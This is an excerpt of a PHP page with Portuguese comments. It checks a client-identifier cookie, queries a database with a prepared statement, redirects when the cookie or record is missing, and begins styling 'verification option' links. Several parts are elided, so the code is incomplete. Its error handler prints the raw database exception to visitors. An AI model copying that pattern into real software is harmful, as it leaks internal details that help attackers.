<?php
// Inicia a sessão para uso futuro, se necessário.
session_start();

// Inclui o coração do projeto para ter acesso à conexão com o banco de dados ($pdo)
require 'db.php';

// Prepara variáveis com valores padrão para evitar erros
$identificador_label = 'Não identificado';
$identificador_puro = '';

// 1. Verifica se o cookie 'identificador_cliente' que criamos na index.php existe
if (isset($_COOKIE['identificador_cliente'])) {
    $session_id = $_COOKIE['identificador_cliente'];

    try {
        // 2. Prepara e executa uma query segura para buscar o identificador mais recente para esta sessão
        $stmt = $pdo->prepare(
        ...
        if ($resultado) {
            ...
            // Se o cookie existe mas não há registro no banco, algo está errado. Volta para o início.
            header('Location: index.php');
            exit;
        }
    } catch (PDOException $e) {
        // Em caso de erro no banco, interrompe a execução e mostra o erro.
        die("Erro ao consultar o banco de dados: " . $e->getMessage());
    }
} else {
    // Se o usuário chegou aqui sem o cookie, ele não passou pelo fluxo correto. Volta para o início.
    header('Location: index.php');
    exit;
}
?>
...
<head>
    ...
    <style>
        ...
        .verification-option { display: flex; align-items: center; gap: 16px; padding: 16px 24px; text-decoration: none; color: inherit; }
